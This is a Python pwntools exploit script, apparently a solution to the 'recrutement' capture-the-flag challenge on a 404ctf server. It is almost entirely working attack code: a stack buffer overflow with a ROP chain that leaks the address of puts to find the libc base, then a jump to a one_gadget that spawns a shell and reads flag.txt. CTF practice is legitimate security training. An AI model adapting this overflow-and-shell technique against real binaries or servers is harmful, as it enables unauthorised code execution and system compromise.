#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]

exe = ELF('./recrutement_patched')
libc = ELF('./libc.so.6')

host, port = "challenge.404ctf.fr", "30690"

p = remote(host,port)

p.sendlineafter(':', 'scientifique')

bss = 0x00000000601c00

pop_rdi = 0x0000000000400763 # pop rdi ; ret
payload = 'A'*0x40+p64(bss)
payload += p64(pop_rdi)+p64(exe.got['puts'])+p64(0x4006c2)

p.sendlineafter(':' , payload)

p.recvuntil('peu.\n', drop=True)
libc.address = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - libc.sym['puts']
print('libc base = '+hex(libc.address))

onegadgets = one_gadget('libc.so.6', libc.address)

payload2 = 'sh'.ljust(0x48,'\x00')
payload2 += p64(onegadgets[0])
p.sendline(payload2)

p.sendline('cat flag.txt')

p.interactive()

